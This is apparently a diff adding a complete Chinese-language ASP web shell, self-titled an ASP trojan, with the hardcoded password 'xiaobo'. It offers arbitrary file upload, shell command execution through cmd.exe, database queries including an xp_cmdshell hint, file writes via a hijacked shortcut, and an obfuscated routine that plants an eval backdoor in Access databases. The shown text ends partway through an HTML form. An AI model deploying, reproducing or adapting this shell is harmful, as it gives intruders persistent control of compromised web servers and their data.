@@ -1,0 +1,1124 @@
+<%@ LANGUAGE="VBSCRIPT"  codepage ="936" 
+'密码第一个是xiaobo,第二个是xiaobo,查找替换这两个单词就可以改成别的密码了%>
+<object runat=server id=objfsolhn scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
+<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
+<object runat=server id=oScriptNetlhn scope=page classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
+<%if err then%>
+<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object> 
+<object runat=server id=oScriptNetlhn scope=page classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object> 
+<%
+end if %>
+<style>
+BODY {SCROLLBAR-FACE-COLOR: #ffe1e8; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: #ffe1e8; SCROLLBAR-SHADOW-COLOR: #ff9dbb; COLOR: #f486a8; SCROLLBAR-3DLIGHT-COLOR: #ff97b9; SCROLLBAR-ARROW-COLOR: #ff6f8f; SCROLLBAR-TRACK-COLOR: #ffe1e8; SCROLLBAR-DARKSHADOW-COLOR: #ffd9e0}
+a:link {font-size: 9pt;color: #ff69b4;text-decoration: none;}
+a:visited {font-size: 9pt;color: #db7093;text-decoration: none;}
+a:hover {font-size: 9pt;color: #ffb6c1;text-decoration: none;}
+table {BORDER-COLLAPSE: collapse;border: 1px dotted #EFEFEF;font-size: 9pt;}
+.noborder {font-size: 9pt;border: none;}
+input {font-size: 9pt;color: #c875a5;background-image: letter-spacing: normal;vertical-align: middle;word-spacing: normal;white-space: normal;border: 1px dotted #c875a5;clear: both;height: auto;width: auto;background-repeat: repeat;overflow: hidden;}
+textarea {font-size: 9pt;background-image: letter-spacing: normal;vertical-align: middle;word-spacing: normal;clear:none;height: auto;width: auto;border: 1px dotted #c875a5;color: #c875a5;}
+</style>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<title>::::海阳顶端网ASP木马＠2005α版::::</title>
+<%'上传代码因化境的太长，这完全是抄桂林老兵的，对此表示感谢--上传类定义
+response.buffer=true
+filename=Request.ServerVariables("URL")
+Server.ScriptTimeout=5000
+On Error Resume Next 
+Dim oUpFileStream
+Class UpFile_Class
+Dim Form,File
+Public Sub GetDate (RetSize)
+   '定义变量
+  Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
+  Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
+  Dim iFindStart,iFindEnd
+  Dim iFormStart,iFormEnd,sFormName
+   '代码开始
+  If Request.TotalBytes < 1 Then
+    Err = 1
+    Exit Sub
+  End If
+  If RetSize > 0 Then 
+    If Request.TotalBytes > RetSize Then
+    Err = 2
+    Exit Sub
+    End If
+  End If
+  Set Form = Server.CreateObject ("Scripting.Dictionary")
+  Form.CompareMode = 1
+  Set File = Server.CreateObject ("Scripting.Dictionary")
+  File.CompareMode = 1
+  Set tStream = Server.CreateObject ("Adodb.Stream")
+  Set oUpFileStream = Server.CreateObject ("Adodb.Stream")
+  oUpFileStream.Type = 1
+  oUpFileStream.Mode = 3
+  oUpFileStream.Open 
+  oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
+  oUpFileStream.Position = 0
+  RequestBinDate = oUpFileStream.Read 
+  iFormEnd = oUpFileStream.Size
+  bCrLf = ChrB (13) & ChrB (10)
+  '取得每个项目之间的分隔符
+  sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
+  iStart = LenB  (sSpace)
+  iFormStart = iStart+2
+  '分解项目
+  Do
+    iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3
+    tStream.Type = 1
+    tStream.Mode = 3
+    tStream.Open
+    oUpFileStream.Position = iFormStart
+    oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
+    tStream.Position = 0
+    tStream.Type = 2
+    tStream.CharSet = "gb2312"
+    sInfo = tStream.ReadText      
+    iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
+    iFindStart = InStr (22,sInfo,"name=""",1)+6
+    iFindEnd = InStr (iFindStart,sInfo,"""",1)
+    sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
+    If InStr  (45,sInfo,"filename=""",1) > 0 Then
+      Set oFileInfo = new FileInfo_Class
+      iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
+      iFindEnd = InStr (iFindStart,sInfo,"""",1)
+      sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
+      oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1) 
+      oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\"))
+      oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
+      iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
+      iFindEnd = InStr (iFindStart,sInfo,vbCr)
+      oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
+      oFileInfo.FileStart = iInfoEnd
+      oFileInfo.FileSize = iFormStart -iInfoEnd -2
+      oFileInfo.FormName = sFormName
+      file.add sFormName,oFileInfo
+    else
+tStream.Close
+      tStream.Type = 1
+      tStream.Mode = 3
+      tStream.Open
+      oUpFileStream.Position = iInfoEnd 
+      oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
+      tStream.Position = 0
+      tStream.Type = 2
+      tStream.CharSet = "gb2312"
+      sFormValue = tStream.ReadText
+      If Form.Exists (sFormName) Then
+        Form (sFormName) = Form (sFormName) & ", " & sFormValue
+        else
+        form.Add sFormName,sFormValue
+      End If
+    End If
+    tStream.Close
+    iFormStart = iFormStart+iStart+2
+  Loop Until  (iFormStart+2) = iFormEnd 
+  RequestBinDate = ""
+  Set tStream = Nothing
+End Sub
+End Class
+Class FileInfo_Class
+Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt
+Public Function SaveToFile (Path)
+  On Error Resume Next
+  Dim oFileStream
+  Set oFileStream = CreateObject ("Adodb.Stream")
+  oFileStream.Type = 1
+  oFileStream.Mode = 3
+  oFileStream.Open
+  oUpFileStream.Position = FileStart
+  oUpFileStream.CopyTo oFileStream,FileSize
+  oFileStream.SaveToFile Path,2
+  oFileStream.Close
+  Set oFileStream = Nothing 
+End Function
+Public Function FileDate
+  oUpFileStream.Position = FileStart
+  FileDate = oUpFileStream.Read (FileSize)
+  End Function
+End Class
+%>
+<% if Request("passwordlcx")="xiaobo" then 
+session("passwordlcx")="lcx" 
+response.redirect Request.ServerVariables("URL") 
+elseif session("passwordlcx")=""then 
+%> 
+<FORM name="user" method="POST"> 
+<center><br><br><br><br><br><br><br><br><br><br>
+<FORM name="user" method="POST"> <INPUT TYPE=password NAME=passwordlcx style="border:1px solid #99CC00; "> <INPUT TYPE=Submit VALUE="海阳顶端网ASP木马＠2005α版" style="border:1px solid #99CC00; "> </form></center> 
+<%else%> 
+<%
+if request("up")="yes" then
+   set upload=new UpFile_Class
+   upload.GetDate (1024*1024)
+   for each formName in upload.file
+   set file=upload.file(formName)
+    if file.FileSize>0 then
+	savepath=upload.form("filepath")
+    file.SaveToFile savepath
+	response.write "上传成功!上传后的路径为"&savepath&"<br>"
+	response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>返回上一页</font></a></center>"
+   end if
+   set file=nothing
+   next
+   set upload=nothing
+   showerr()
+   response.end
+end if
+%>
+<%
+function out() 
+Response.Cookies("password")=""
+response.redirect ""&url&""
+End Function%>
+<%'-------------------搜索文件函数------------------
+on error resume next
+SearchString = Request("SearchString")
+count=0
+Function SearchFile( f, s, title )
+Set fo = objfsolhn.OpenTextFile(f)
+content = fo.ReadAll'读全部文本到content
+fo.Close
+SearchFile = inStr(1, content, S, vbTextCompare)>0  '从第一个字符开始检查content里面是否有S
+If SearchFile Then'如果有,则提出文件TITLE存入变量
+pos1 = InStr(1, content, "<TITLE>", vbTextCompare)
+pos2 = InStr(1, content, "</TITLE>", vbTextCompare)
+title = ""
+If pos1 > 0 And pos2 > 0 Then'取TITLE标记中间的字符
+title = Mid( content, pos1 + 7, pos2 - pos1 - 7 )
+End If
+End If
+End Function
+Function FileLink( f, title )
+vPath =f.Path'取路径
+If title = "" Then title = f.Name'做链接
+'FileLink = "<A HREF=""" & vPath & """>" & title & "</A>"
+FileLink = vPath 
+FileLink = "<UL>·" & FileLink & "</UL>"
+End Function
+Sub SearchFolder( fd, s )
+found = False
+For each f In fd.Files
+pos = InStrRev(f.Path, "." )
+If pos > 0 Then
+ext = Mid(f.Path, pos + 1 )
+Else
+ext = ""
+End If
+If LCase(ext) = "asp" or LCase(ext) = "asa" or LCase(ext) = "cer"  or LCase(ext) = "cdx" Then
+If SearchFile( f, s, title ) Then
+Response.Write FileLink(f, title)
+count=count+1
+End If
+End If
+Next
+For each sfd In fd.SubFolders
+SearchFolder sfd, s
+Next
+End Sub'搜索结束%>
+<%'-------------------------mssql的sql扩展开始---------------------------------
+Dim strsql, objDBConn, objRS, intFieldCount, intCounter,strcon
+strcon =trim(Request.form("strcon"))
+strsql =trim(Request.form("SQL"))
+if strSQL <> "" and lcase(left(trim(strsql),6))<>"select" Then
+Response.Write "SQL命令: " & strsql & "成功运行<br>" 
+Set objDBConn = Server.CreateObject("ADODB.Connection")
+  objDBConn.Open strcon
+ objdbconn.execute(strsql)
+ objDBConn.Close   
+   Set objDBConn = Nothing 
+end if
+'-----------------------------------数据库记录列表----------------------------------------
+DBDriver = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" 
+strRootFolder = Server.MapPath("/")
+scriptname = Request.ServerVariables("SCRIPT_NAME")    
+if request("op")="db" and request("dbname")<>"" and request("tablename")<>"" then
+dbname=trim(request("dbname"))
+tablename=request("tablename")
+Set objConn = Server.CreateObject("ADODB.Connection")
+if instr(dbname,"Info=False")>0  then 
+objConn.ConnectionString = dbname
+else
+objConn.ConnectionString = DBDriver & dbname
+end if 
+objConn.Open
+Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
+if tablename="" then tablename=objTableRS("Table_Name").Value
+%>
+<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
+  <tr><td width="19%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>"><%=objfsolhn.GetFilename(dbname)%></a><br>
+      <br>
+      <table width="95%" border="0" cellspacing="0" cellpadding="6">
+        <%Do While Not objTableRS.EOF%> 
+        <tr> 
+          <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
+        </tr>
+        <%objTableRS.MoveNext
+		Loop%> 
+      </table>
+    </td>
+    <td width="81%" valign="top">
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr valign="top"> 
+          <td align="center" valign="top"><font color="#330099"><%=tablename%></font> 
+            <form action="<%=scriptname%>" method="post" name="sqlcmd" id="sqlcmd">
+              <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tr valign="top"> 
+                  <td align="center"> <input name="cmd" type="text" id="cmd" size="60"> 
+                    <input name="op" type="hidden" id="op" value="sql"> <input name="dbname" type="hidden" id="dbname" value="<%=request("dbname")%>"> 
+                    <input type="submit" value="执行SQL"></td></tr></table></form> </td></tr></table>
+<table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
+<tr bgcolor="#CCCCCC" align="center" valign="top">
+<%dim mysql,i,j
+j=1
+mysql="Select Top 10 * From ["&tablename&"]"
+Set objRS=objConn.Execute(mysql)
+For i=0 to objRs.Fields.Count-1
+Response.write"<td><b>"&objRS.Fields(i).name&"</b></td>"
+Next
+Response.write "</tr>"
+if objrs.eof then
+else
+DO While NOT objRS.Eof
+Response.write "<tr>"
+%>
+<%
+For i=0 to objRs.Fields.Count-1
+Response.write"<td>"
+If IsNull(objRs.Fields(i).value) or objRs.Fields(i).value="" or objRs.Fields(i).value=" " then
+response.write "&nbsp;"
+else
+  Response.write Server.HTMLEncode(objRs.Fields(i).value)
+ end if
+Response.write"</td>"
+Next
+Response.write"</tr>"
+objRS.MoveNext
+j=j+1
+Loop
+end if
+set objRs = nothing
+set objTableRS = nothing
+objConn.Close
+set objConn = nothing
+%>
+</table>
+<p>最多显示10条记录，要察看更多记录请使用SQL命令</p><br>
+</table>
+<%
+Response.End
+end if
+%>
+<%
+'----------------------------数据库对象列表---------------------------------------------
+if request("op")="db" and request("dbname")<>"" then
+dbname=trim(request("dbname"))
+Set objConn = Server.CreateObject("ADODB.Connection")
+'objConn.ConnectionString = DBDriver & dbname
+if instr(dbname,"Info=False")>0  then 
+objConn.ConnectionString = dbname
+else
+objConn.ConnectionString = DBDriver & dbname
+end if 
+objConn.Open
+Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
+%>
+<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
+  <tr>
+    <td width="19%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=dbname%>"><%=objfsolhn.GetFilename(dbname)%></a><br>
+      <br>
+      <table width="95%" border="0" cellspacing="0" cellpadding="6">
+        <%Do While Not objTableRS.EOF%> 
+        <tr> 
+          <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
+        </tr>
+        <%objTableRS.MoveNext
+		Loop
+		objTableRS.MoveFirst%> 
+      </table>
+    </td>
+    <td width="81%" align="center" valign="top"><a href="<%=scriptname%>?op=sql&dbname=<%=dbname%>">执行SQL命令<br>
+      </a> 
+      <%While Not objTableRS.EOF%>
+      <table width="98%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
+        <tr align="center" bgcolor="#FFFFCC"> 
+          <td colspan="6"><font color="#660000" size="2"><b><%=objTableRS("Table_Name").Value%></b></font></td>
+        </tr> <tr align="center">  <td>字段名</td> <td>数据类型</td><td>字段大小</td><td>精度</td><td>是否允许为空</td><td>默认值</td> </tr> <tr>
+		<%Set objColumnRS = objConn.OpenSchema(4,Array(Empty, Empty, objTableRS("Table_Name").Value))
+        While Not objColumnRS.EOF
+        iLength = objColumnRS("Character_Maximum_Length")
+		iPrecision = objColumnRS("Numeric_Precision")	
+	            iScale = objColumnRS("Numeric_Scale")
+		iDefaultValue = objColumnRS("Column_Default")
+              	If IsNull(iLength) then iLength = "&nbsp;"	
+	            If IsNull(iPrecision) then iPrecision = "&nbsp;"
+		If IsNull(iScale) then iScale = "&nbsp;"
+		If IsNull(iDefaultValue) then iDefaultValue = "&nbsp;"%>
+          <td width="29%" height="8"><%=objColumnRS("Column_Name")%></td>
+          <td width="12%" height="8"><%=fieldtype(objColumnRS("Data_Type"))%></td>
+          <td width="11%" height="8"><%=iLength%></td>
+          <td width="9%" height="8"><%=iPrecision%></td>
+          <td width="17%" align="center" height="8"> 
+            <%If objColumnRS("Is_Nullable") then
+			Response.Write "是"
+            else
+            Response.write "否"
+		End If%>
+          </td>
+          <td width="22%" height="8"><%=iDefaultValue%></td>
+        </tr>
+        <%objColumnRS.MoveNext
+	Wend
+	objTableRS.MoveNext
+	Set objColumnRS = Nothing
+Response.write "<br>"
+Wend
+objTableRS.Close
+Set objTableRS = Nothing
+objConn.Close
+Set objConn = Nothing
+%>
+ </table> </td> </table>
+<%
+Response.End
+end if
+%>
+<%
+'----------------------------执行SQL命令---------------------------------------------
+if request("op")="sql" then
+dbname=trim(request("dbname"))
+Set objConn = Server.CreateObject("ADODB.Connection")
+'objConn.ConnectionString = DBDriver & dbname
+if instr(dbname,"Info=False")>0  then 
+objConn.ConnectionString = dbname
+else
+objConn.ConnectionString = DBDriver & dbname
+end if 
+objConn.Open
+Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
+j=0
+%>
+<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
+  <tr>
+    <td width="13%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>"><%=objfsolhn.GetFilename(dbname)%></a><br>
+      <br>
+      <table width="95%" border="0" cellspacing="0" cellpadding="6">
+        <%Do While Not objTableRS.EOF%> 
+        <tr> 
+          <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
+        </tr>
+        <%objTableRS.MoveNext
+		Loop%> 
+      </table>
+    </td>
+    <td width="87%" align="center" valign="top"> 
+      <form action="<%=scriptname%>" method="post" name="sqlcmd" id="sqlcmd">
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr valign="top"> 
+          <td align="center">
+				<input name="cmd" type="text" id="cmd" size="60">
+              <input name="op" type="hidden" id="op" value="sql">
+			  <input name="dbname" type="hidden" id="dbname" value="<%=request("dbname")%>">
+              <input type="submit" value="执行SQL"></td>
+        </tr>
+      </table>
+      </form> 
+      <table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
+        <tr bgcolor="#CCCCCC" align="center" valign="top">
+<%if request("cmd")<>"" then
+mysql=request("cmd")
+Set objRS=objConn.Execute(mysql)
+if objrs.state = 1 then 
+For i=0 to objRs.Fields.Count-1
+Response.write"<td><b>"&objRS.Fields(i).name&"</b></td>"
+Next
+Response.write "</tr>"
+if objrs.eof then
+%>
+<%else
+DO While NOT objRS.Eof
+Response.write "<tr>"
+%>
+<%
+For i=0 to objRs.Fields.Count-1
+Response.write"<td>"
+If IsNull(objRs.Fields(i).value) or objRs.Fields(i).value="" or objRs.Fields(i).value=" " then
+response.write "&nbsp;"
+else
+  Response.write Server.HTMLEncode(objRs.Fields(i).value)
+ end if
+Response.write"</td>"
+Next
+Response.write"</tr>"
+objRS.MoveNext
+j=j+1
+Loop
+end if
+set objRs = nothing
+end if
+end if
+set objTableRS = nothing
+objConn.Close
+set objConn = nothing
+%>
+     </table>
+      <br>
+      <%if request("cmd")<>"" then response.Write("命令执行成功，返回 <font color=""#FF0000"">"&j&"</font> 条记录")%>
+  </table>
+<%
+Response.End
+end if
+%>
+<%
+url= Request.ServerVariables("URL")
+if trim(request.form("password"))<>"" and trim(request.form("password"))<>"xiaobo" then call out()
+if trim(request.form("password"))="xiaobo" then
+response.cookies("password")="allen"
+response.redirect ""&url&""
+else if Request.Cookies("password")<>"allen" then
+call login() '密码错误
+response.end '停止运行
+end if
+select case request("id")
+case "edit"
+call edit()
+case "upload"
+call upload()
+case "dir"
+call dir()
+case "down"
+call downloadFile(request("path"))
+case "inject"
+call inject()
+case else
+call main()
+end select
+end if
+sub login()
+for i=0 to 25
+on error resume next
+IsObj=false
+VerObj=""
+dim TestObj
+set TestObj=server.CreateObject(ObjTotest(i,0))
+If -2147221005 <> Err then
+IsObj = True
+VerObj = TestObj.version
+if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
+end if
+ObjTotest(i,2)=IsObj
+ObjTotest(i,3)=VerObj
+next
+%>
+<center>
+<table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
+<tr><td>
+<table border=0 width=100% cellspacing=1 cellpadding=0 class="noborder" >
+<tr bgcolor="#EEEEEE" height=18 class="noborder">
+<td width="59%" align=left>&nbsp;服务器名</td>
+<td width="41%" bgcolor="#EEEEEE">&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
+</tr>
+<tr bgcolor="#EEEEEE" height=18 class="noborder">
+<td align=left>&nbsp;服务器IP</td>
+<td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
+</tr>
+<tr bgcolor="#EEEEEE" height=18 class="noborder">
+<td align=left>&nbsp;服务器时间</td>
+<td>&nbsp;<%=now%></td>
+</tr>
+<tr bgcolor="#EEEEEE" height=18 class="noborder">
+<td align=left>&nbsp;本文件绝对路径</td>
+<td>&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
+</tr>
+<tr bgcolor="#EEEEEE" height=18 class="noborder">
+<td align=left>&nbsp;服务器操作系统</td>
+<td>&nbsp;<%=Request.ServerVariables("OS")%></td>
+</tr>
+<tr bgcolor="#EEEEEE" height=18 class="noborder"><%
+dim t1,t2,lsabc,thetime
+t1=timer
+for i=1 to 500000
+lsabc= 1 + 1
+next
+t2=timer
+thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)
+%><td align=left>&nbsp服务器运算速度测试</td>
+<td>&nbsp;<font color=red><%=thetime%> 毫秒</font></td>
+</tr>
+</table><center><br>
+<script language="JavaScript">
+function openwin() { 
+var newwin=window.open("","newwin","top=0,left=0,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=700,height=600"); 
+document.form9.action="";
+document.form9.submit();
+return true;} 
+</script>
+<script language="JavaScript">
+function char() { 
+alert("这里是在ACESS数据里插入冰狐浪子的后门,默认密码是#\n成功的前提是数据库是asp后缀，并且没有错乱asp代码\n");
+window.open("<%=url%>?dbname="+form9.dbname.value); 
+self.close();
+return true;} 
+</script>
+<form  action="<%=url%>"  name=form9 target="newwin" method="GET">
+<table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
+  <tr bgcolor="#EEEEEE" height=18 class="noborder">
+      <td>&nbspmdb+sql数据库操作:</td>
+      <td>
+<input type=hidden name=op value="db">
+<input type=text name=dbname value="Provider=SQLOLEDB.1;Persist Security Info=False;Server=127.0.0.1;User ID=sa;Password=lcx;Database=bbs;" size ="40"> <input type="button" value="提交" onclick="openwin()"> <input type="button" value="插入" onclick="char()"> <input type="button" value="提示" onclick="prompt('插入只针对ACESS操作','浏览ACESS,要写入MDB的绝对路径，如d:bbs.mdb;更改表单中对应的MSSQL字符串就可以操作sql库了')"></td></tr></table></form>
+<%' -------------------在ACESS数据库里写入asp后门开始-----------------------
+DBDriver = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" 
+dbname=request("dbname") 
+Set objConn = Server.CreateObject("ADODB.Connection")
+objConn.ConnectionString = DBDriver & dbname
+objConn.Open
+objConn.execute("create table notdownloadlcx(notdownloadlcx oleobject)")
+set rs=server.createobject("adodb.recordset")
+    sql="select * from notdownloadlcx"
+	rs.open sql,objConn,1,3
+	rs.addnew
+    rs("notdownloadlcx").appendchunk(chrB(asc("<")) & chrB(asc("s")) & chrB(asc("c"))& chrB(asc("r")) & chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(" "))& chrB(asc("r"))& chrB(asc("u"))& chrB(asc("n"))& chrB(asc("a"))& chrB(asc("t"))& chrB(asc("="))& chrB(asc("s"))& chrB(asc("e"))& chrB(asc("r"))& chrB(asc("v"))& chrB(asc("e"))& chrB(asc("r"))& chrB(asc(" "))& chrB(asc("l"))& chrB(asc("a"))& chrB(asc("n"))& chrB(asc("g"))& chrB(asc("u"))& chrB(asc("a"))& chrB(asc("g"))& chrB(asc("e"))& chrB(asc("="))& chrB(asc("j"))& chrB(asc("a"))& chrB(asc("v"))& chrB(asc("a"))& chrB(asc("s"))& chrB(asc("c"))& chrB(asc("r"))& chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(">"))& chrB(asc("e"))& chrB(asc("v"))& chrB(asc("a"))& chrB(asc("l"))& chrB(asc("("))& chrB(asc("r"))& chrB(asc("e"))& chrB(asc("q"))& chrB(asc("u"))& chrB(asc("e"))& chrB(asc("s"))& chrB(asc("t"))& chrB(asc("."))& chrB(asc("f"))& chrB(asc("o"))& chrB(asc("r"))& chrB(asc("m"))& chrB(asc("("))& chrB(asc("'"))& chrB(asc("#"))& chrB(asc("'"))& chrB(asc(")"))& chrB(asc("+"))& chrB(asc("'"))& chrB(asc("'"))& chrB(asc(")"))& chrB(asc("<"))& chrB(asc("/"))& chrB(asc("s"))& chrB(asc("c"))& chrB(asc("r"))& chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(">")))
+    rs.update
+    rs.close
+set rs=nothing
+objConn.close
+set objConn=nothing
+'-----------------------------------------------------数据库操作结束------------------------------------
+'---------------------免fso代码写文件开始针对中文-----------------------------------
+pathlcx=trim(Request.form("pathlcx"))
+textlcx=trim(Request.form("textlcx"))
+if textlcx<>"" and pathlcx<>"" then
+textlcx=replace(textlcx,">","^>")
+textlcx=replace(textlcx,"<","^<")
+textlcx=replace(textlcx,"&","^&")
+textlcx=replace(textlcx,chr(34),"^"&chr(34))
+textlcx=replace(textlcx,chr(10),"^"&chr(10))
+textlcx=replace(textlcx,chr(13),"^"&chr(13))
+set shell=server.createobject("shell.application")
+set shellfolder=shell.namespace("C:\Documents and Settings\Default User\「开始」菜单\程序\附件")
+set shellfolderitem=shellfolder.parsename("记事本.lnk")
+set objshelllink =shellfolderitem.getlink
+objshelllink.path="cmd.exe"
+objshelllink.arguments="/c echo "&textlcx&">"&pathlcx&" &&del c:\a.lnk"
+objshelllink.save("c:\a.lnk")
+shell.namespace("c:\").items.item("a.lnk").invokeverb
+end if
+'--------------免fso代码写文件结束-----------免fso表单开始-------------%>
+<table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder"><tr bgcolor="#EEEEEE" height=18 class="noborder" style='table-layout:fixed; word-break:break-all'><td align=left>
+<form action="<%= Request.ServerVariables("URL") %>" method="post">
+<input type=text name=text value="<%=DSnXA %>">  <font class=fonts>输入要浏览的目录,最后要加\</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
+<input type=text name=text1 value="<%=DSnXA1 %>">
+copy
+<input type=text name=text2 value="<%=DSnXA2 %>"> <font class=fonts>目录或文件(不要加目录和文件名）</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
+<input type=text name=text3 value="<%=DSnXA3 %>">
+move
+<input type=text name=text4 value="<%=DSnXA4 %>"><font class=fonts> 目录或文件(不要加目录和文件名）</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
+路径：<input type=text name=text5 value="<%=DSnXA5 %>" >
+程序：<input type=text name=text6 value="<%=DSnXA6 %>" ><font class=fonts> 不可以加参数</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type="text" name="ok" size=55><font class=fonts> CMD命令对话框</font>
+</td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type=text name=pathlcx size=55><font class=fonts> 路径与文件名</font></td><tr/>
+<tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
+<textarea  cols=80 rows=5 name=textlcx >
+要生成的文件内容，不可以有回车：
+<% ok=Request("ok")
+response.write oScriptlhn.exec ("cmd.exe /c "& ok).stdout.readall
+%></textarea>
+<input type=submit name=sb value=发送命令 class=input>
+</form></td></tr><%'-------------免fso表单单代码结束------------%>
+<script language=vbs>
+sub main()
+base=document.all.text9.value
+If IsNumeric(base) Then
+cc=hex(cstr(base))
+alert("10进制为"&base) 
+alert("16进制为"&cc)
+exit sub
+end if 
+aa=asc(cstr(base))
+bb=hex(aa)
+alert("10进制为"&aa) 
+alert("16进制为"&bb)
+end sub
+sub main2()
+If document.all.vars.value<>"" Then
+'定义相关变量
+Dim nums,tmp,tmpstr,i
+nums=document.all.vars.value   '取得从用户端输入进来的16进制数值
+nums_len=Len(nums)     '得出nums的长度
+'开始循环，次数为nums的长度值
+For i=1 To nums_len
+    tmp=Mid(nums,i,1)    '取出nums的第1个字符存放到临时变量tmp中
+    If IsNumeric(tmp) Then    '如果tmp中的内容是数值型，则执行下面代码
+        tmp=tmp * 16 * (16^(nums_len-i-1))    '此为16进制数值型数据转化为10进制数值的公式
+    Else
+        '限制输入的16进制数的范围在0--9及a--f之间
+        If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then 
+            alert("你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。")
+            exit sub
+        End If
+        tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))    '此为16进制字符串型数据转化为10进制数值的公式
+    End If
+        '将上面转化后的数值与tmpstr相加累计出总和
+        tmpstr=tmpstr+tmp
+Next
+alert("转换的10进制为:"&tmpstr&"其字符值为:"&chr(tmpstr))
+End If
+end sub
+</script>
+<input type=text name=text1 value=字符和数字转10和16进制 size=30 id=text9><input type=submit onclick=main() value="给我转">
+<input type="text" name="vars" value=16进制转10进制和字符 size=30 id=vars><input type=submit onclick=main2() value="给我转"></table>
+</center>
+<br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
+<tr bgcolor="#EEEEEE" height=18 class="noborder">
+<form  action=""  method="post">
+<Input TYPE="TEXT" NAME="SQL" value="<%=strSQL%>" size ="30">
+  <Input TYPE="TEXT" NAME="strcon" value="Provider=SQLOLEDB.1;Persist Security Info=False;Server=SQL服务器ip;UserID=用户名;Password=密码;" size=30 >
+<input TYPE="SUBMIT" value="sql扩展">&nbsp
+<input type="button"   value="提示" onClick="prompt('可以执行mssql扩展,举例:exec master.dbo.xp_cmdshell 命令语句','更改表单字符串中的相应值后再进行操作')" >
